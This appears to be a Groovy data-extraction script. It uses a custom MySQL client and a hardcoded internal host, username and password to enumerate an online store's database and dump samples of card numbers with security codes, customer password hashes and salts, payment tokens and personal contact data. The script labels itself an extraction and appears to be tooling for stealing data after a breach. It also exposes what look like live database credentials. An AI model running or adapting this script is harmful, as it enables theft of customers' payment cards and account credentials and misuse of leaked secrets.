import java.net.Socket
import java.net.InetSocketAddress
import java.security.MessageDigest

// Minimal MySQL client - one connection per query to avoid buffer pollution
class MySQLConn {
  String host; int port; String user; String pass
  DataInputStream ins; BufferedOutputStream outs; Socket sock
  
  boolean open() {
    try {
      sock = new Socket(); sock.connect(new InetSocketAddress(host, port), 6000); sock.setSoTimeout(15000)
      ins = new DataInputStream(new BufferedInputStream(sock.getInputStream()))
      outs = new BufferedOutputStream(sock.getOutputStream())
      byte[] p = readPkt()
      if ((p[0] & 0xFF) != 10) return false
      int i = 1; while (p[i] != 0) i++; i++; i += 4
      byte[] s1 = new byte[8]; System.arraycopy(p, i, s1, 0, 8); i += 8
      i++; i += 2; i++; i += 2; i += 2
      int aLen = (p[i] & 0xFF); i++; i += 10
      def s2l = []; int av = p.length - i
      for (int k = 0; k < Math.min(Math.max(13, aLen-8), av); k++) { if (p[i+k] != 0) s2l.add(p[i+k]) }
      byte[] seed = new byte[8 + s2l.size()]; System.arraycopy(s1, 0, seed, 0, 8)
      for (int k = 0; k < s2l.size(); k++) seed[8+k] = (byte)s2l[k]
      def md = MessageDigest.getInstance('SHA-1')
      byte[] h1 = md.digest(pass.getBytes('UTF-8')); byte[] h2 = md.digest(h1)
      md.reset(); md.update(seed); md.update(h2); byte[] h3 = md.digest()
      byte[] tok = new byte[20]; for (int j = 0; j < 20; j++) tok[j] = (byte)((h1[j] ^ h3[j]) & 0xFF)
      int caps = 0x1 | 0x200 | 0x2000 | 0x8000 | 0x80000 | 0x20000
      ByteArrayOutputStream b = new ByteArrayOutputStream()
      b.write(caps & 0xFF); b.write((caps>>8) & 0xFF); b.write((caps>>16) & 0xFF); b.write((caps>>24) & 0xFF)
      b.write(0); b.write(0); b.write(0); b.write(1); b.write(33); b.write(new byte[23])
      b.write(user.getBytes('UTF-8')); b.write(0); b.write(tok.length); b.write(tok)
      b.write('mysql_native_password'.getBytes('UTF-8')); b.write(0)
      writePkt(1, b.toByteArray()); byte[] ap = readPkt()
      return (ap[0] & 0xFF) == 0x00
    } catch (Exception e) { return false }
  }
  
  void close() { try { sock?.close() } catch (Exception ignored) {} }
  
  byte[] readPkt() {
    int len = (ins.readUnsignedByte()) | (ins.readUnsignedByte()<<8) | (ins.readUnsignedByte()<<16)
    ins.readUnsignedByte(); byte[] pl = new byte[len]; ins.readFully(pl); return pl
  }
  void writePkt(int seq, byte[] pl) {
    int len = pl.length
    outs.write(len&0xFF); outs.write((len>>8)&0xFF); outs.write((len>>16)&0xFF); outs.write(seq&0xFF)
    outs.write(pl); outs.flush()
  }
  
  List<List<String>> query(String q) {
    ByteArrayOutputStream qb = new ByteArrayOutputStream(); qb.write(0x03); qb.write(q.getBytes('UTF-8'))
    writePkt(0, qb.toByteArray()); byte[] rp = readPkt(); int b0 = rp[0] & 0xFF
    if (b0 == 0xFF || b0 == 0x00) return []
    // read col count
    long cc = 0; int ii = 0
    int fb = rp[ii] & 0xFF; ii++
    if (fb < 0xFB) cc = (long) fb
    else if (fb == 0xFC) { cc = (rp[ii]&0xFF)|((rp[ii+1]&0xFF)<<8); ii+=2 }
    else if (fb == 0xFD) { cc = (rp[ii]&0xFF)|((rp[ii+1]&0xFF)<<8)|((rp[ii+2]&0xFF)<<16); ii+=3 }
    def cols = []; (0..<cc).each { byte[] cp = readPkt(); def ci = 0; 4.times { int l=(cp[ci]&0xFF);ci++;if(l<0xFB){ci+=l}else if(l==0xFC){ci+=2+(((cp[ci]&0xFF)|((cp[ci+1]&0xFF)<<8))&0xFFFF)}else{ci+=3+(((cp[ci]&0xFF)|((cp[ci+1]&0xFF)<<8)|((cp[ci+2]&0xFF)<<16)))} }; int cl=(cp[ci]&0xFF);ci++;cols.add(new String(cp,ci,cl,'UTF-8')) }
    readPkt() // EOF
    def rows = []; int guard = 0
    while (guard++ < 2000) {
      byte[] rp2 = readPkt(); int rb = rp2[0] & 0xFF
      if (rb == 0xFE && rp2.length < 9) break
      if (rb == 0xFF) break
      def vals = []; int ri = 0
      (0..<cc).each {
        int l = rp2[ri] & 0xFF; ri++
        if (l == 0xFB) { vals.add('NULL') }
        else if (l == 0xFC) { int ln = (rp2[ri]&0xFF)|((rp2[ri+1]&0xFF)<<8); ri+=2; vals.add(new String(rp2,ri,ln,'UTF-8').take(300)); ri+=ln }
        else if (l == 0xFD) { int ln = (rp2[ri]&0xFF)|((rp2[ri+1]&0xFF)<<8)|((rp2[ri+2]&0xFF)<<16); ri+=3; vals.add(new String(rp2,ri,ln,'UTF-8').take(300)); ri+=ln }
        else { vals.add(new String(rp2,ri,l,'UTF-8').take(300)); ri+=l }
      }
      rows.add(vals)
    }
    return rows
  }
  
  void printTable(String q) {
    def rows = query(q); if (rows.isEmpty()) { println "  (empty or error)"; return }
    rows.each { println "  " + it.join(" | ") }
  }
}

def HOST = '172.27.141.6'
def PORT = 3312
def USER = 'dbcronproductos'
def PASS = '0c1A0ZW0Kh#wjqdRHV$b63A'

// Each "run" opens a fresh connection to avoid buffer pollution
def run = { String label, String q ->
  println "\n=== $label ==="
  def mc = new MySQLConn(host: HOST, port: PORT, user: USER, pass: PASS)
  if (!mc.open()) { println "AUTH_FAIL"; return }
  mc.printTable(q)
  mc.close()
}

// COUNT sensitive tables
run("COUNT pedidos",          "SELECT COUNT(*) FROM tienda.pedidos")
run("COUNT clientes",         "SELECT COUNT(*) FROM tienda.clientes")  
run("COUNT clientescontrasena", "SELECT COUNT(*) FROM tienda.clientescontrasena")
run("COUNT datostarjeta",     "SELECT COUNT(*) FROM tienda.datostarjeta")
run("COUNT cybersource_sears", "SELECT COUNT(*) FROM tienda.cybersource_sears")
run("COUNT cybersource_transacciones", "SELECT COUNT(*) FROM tienda.cybersource_transacciones")
run("COUNT conciliacion_sears", "SELECT COUNT(*) FROM tienda.conciliacion_sears")
run("COUNT datos_pedido",     "SELECT COUNT(*) FROM tienda.datos_pedido")
run("COUNT pedidos_facturacion", "SELECT COUNT(*) FROM tienda.pedidos_facturacion")

// Describe key tables
run("DESCRIBE pedidos",       "SELECT COLUMN_NAME,COLUMN_TYPE FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='tienda' AND TABLE_NAME='pedidos' ORDER BY ORDINAL_POSITION")
run("DESCRIBE datostarjeta",  "SELECT COLUMN_NAME,COLUMN_TYPE FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='tienda' AND TABLE_NAME='datostarjeta' ORDER BY ORDINAL_POSITION")
run("DESCRIBE clientescontrasena", "SELECT COLUMN_NAME,COLUMN_TYPE FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='tienda' AND TABLE_NAME='clientescontrasena' ORDER BY ORDINAL_POSITION")
run("DESCRIBE clientes",      "SELECT COLUMN_NAME,COLUMN_TYPE FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='tienda' AND TABLE_NAME='clientes' LIMIT 20")

// Sample CRITICAL data — pedidos (cards)
run("SAMPLE pedidos TOP 10",  "SELECT idpedido,fechapedido,tipotarjeta,nombre,numero,mes,ao,seguridad,total FROM tienda.pedidos WHERE numero IS NOT NULL AND numero != '' ORDER BY idpedido DESC LIMIT 10")

// Sample clientescontrasena (passwords)
run("SAMPLE clientescontrasena", "SELECT idcliente,correo,contrasena,salt FROM tienda.clientescontrasena LIMIT 10")

// Sample clientes
run("SAMPLE clientes",        "SELECT idcliente,nombre,apellidopaterno,correo,telefono FROM tienda.clientes LIMIT 10")

// Sample datostarjeta
run("SAMPLE datostarjeta",    "SELECT * FROM tienda.datostarjeta LIMIT 5")

// Sample cybersource_sears (payment tokens)
run("SAMPLE cybersource_sears", "SELECT * FROM tienda.cybersource_sears LIMIT 5")

// Sample datos_pedido 
run("SAMPLE datos_pedido",    "SELECT * FROM tienda.datos_pedido LIMIT 5")

println "\n=== FIN EXTRACCION TIENDA ==="
